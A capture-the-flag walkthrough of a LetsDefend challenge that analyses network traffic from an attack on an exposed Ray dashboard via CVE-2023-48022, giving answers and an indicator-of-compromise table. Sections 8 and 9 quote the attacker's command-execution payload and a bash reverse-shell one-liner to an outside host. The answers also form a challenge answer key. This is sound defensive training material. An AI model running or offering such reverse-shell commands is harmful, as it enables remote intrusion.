
# 🧠💥 Let’sDefend Walkthrough – Compromised AI Cluster Challenge

Welcome to this **step-by-step walkthrough** of the _Compromised AI Cluster_ challenge on [Let’sDefend](https://letsdefend.io)! 🛡️ In this scenario, we’re diving into an incident involving an AI infrastructure running **Ray**—an open-source distributed computing framework.

> 🎯 **Objective:** Analyze the PCAP, identify attacker behavior, and extract indicators of compromise (IOCs).

---

## 🧰 Tools Used

- 🕵️‍♂️ **Wireshark** – for network packet analysis
- 🎯 **HTTP protocol knowledge** – to interpret requests/responses
- 🧹 **Filters & Search** – to extract relevant activity

---

## 🔎 1. Identify the Active Software Framework

**📝 Question:** What software framework was active on the server at the time of the incident?

📡 After opening the PCAP in Wireshark and examining HTTP request paths and payloads, I saw multiple references to `/api/jobs`—a Ray dashboard feature.

✅ **Answer:** `Ray`

---

## 🧩 2. Determine the Framework Version

**📝 Question:** What version of the software framework was installed?

🔍 Filter used:

```
http contains "version"
```

📄 Found version number in HTTP response payload.

✅ **Answer:** `2.8.0`

---

## 🌐 3. Public IP and Port of Ray Dashboard

**📝 Question:** What is the public IP address and port?

Look for the `Host:` header in HTTP requests.

✅ **Answer:** `3.72.0.226:8265`

---

## 👀 4. Persistent Malicious IP

**📝 Question:** Which IP persistently accessed the dashboard?

Filtered `/api/jobs`, `/api/packages`, etc.

✅ **Answer:** `104.28.245.2`

---

## ⏱️ 5. First Attacker Contact

**📝 Question:** When did attacker first interact with the system?

Filtered for ICMP packets and located first ping.

✅ **Answer:** `2024-04-12 15:51:41 UTC`

---

## 🧪 6. Initial Job Submission

**📝 Question:** What is the first job submission ID?

Used:

```
http.request.method == "POST" && http contains "/api/jobs"
```

📦 Payload:

```json
"submission_id": "raysubmit_kkeJ8vLuM942ycqH"
```

✅ **Answer:** `raysubmit_kkeJ8vLuM942ycqH`

---

## 🐞 7. CVE Exploited

**📝 Question:** What vulnerability was used?

Attackers submitted jobs to Ray via its unauthenticated dashboard API—a known issue:

✅ **Answer:** `CVE-2023-48022`

---

## 🖥️ 8. First Executed Command

**📝 Question:** What was the first command run?

👨‍💻 Job payload:

```python
import os; os.system('whoami')
```

✅ **Answer:** `whoami`

---

## 🛰️ 9. Reverse Shell Target

**📝 Question:** Where was the reverse shell initiated?

Detected outbound TCP connection in a job:

```bash
bash -i >& /dev/tcp/52.150.25.174/1337 0>&1
```

✅ **Answer:** `52.150.25.174:1337`

---

## 📁 10. Reverse Shell Directory

**📝 Question:** From what directory was the reverse shell executed?

📂 Directory seen in job environment:

✅ **Answer:**  
`/tmp/ray/session_2024-04-12_11-13-55_403523_10331/runtime_resources/working_dir_files/_ray_pkg_bf19252c1fb036e5`

---

## 🛫 11. Secrets Exfiltration Job ID

**📝 Question:** What job was used to steal the secrets file?

✅ **Answer:** `raysubmit_7WZE36LAkVxbNc1x`

---

## 🔀 12. New IP Used in Later Stages

**📝 Question:** What new IP address was used?

✅ **Answer:** `104.28.213.2`

---

## 📜 13. Contents of Exfiltrated File

**📝 Question:** What was in the exfiltrated file?

📄 `secret.txt` contents:

✅ **Answer:** `"Ops, you got me."`

---

## 🔓 14. Brute Force Behavior

**📝 Question:** How many brute-force packets were sent?

Used Wireshark filter:

```
ip.src == 104.28.154.194 && tcp.flags.syn == 1 && tcp.flags.ack == 0 && ip.dst == 172.31.30.230
```

Navigated to:

```
Statistics > Endpoints > IPv4
```

✅ **Answer:** `39,598 SYN packets`

---

## 🧠 Lessons Learned

📌 **Never expose dev/admin dashboards to the public.**  
📌 Monitor job submissions and API abuse.  
📌 Use firewall rules to restrict access to sensitive ports.  
📌 Watch for abnormal outbound connections (reverse shells, high SYN count).

---

## 🚨 Indicators of Compromise (IOCs)

| 🔎 Type           | 🧾 Value                           |
|------------------|------------------------------------|
| Attacker IPs     | 104.28.245.2, 104.28.213.2, 104.28.154.194 |
| CVE Exploited    | CVE-2023-48022                    |
| Reverse Shell    | 52.150.25.174:1337                |
| Commands Run     | `whoami`, reverse shell script    |
| File Exfiltrated | `secret.txt`                      |

---

Thanks for reading! If this helped you solve the challenge, consider giving it a ⭐ on GitHub or sharing with your fellow defenders! 💪🛡️
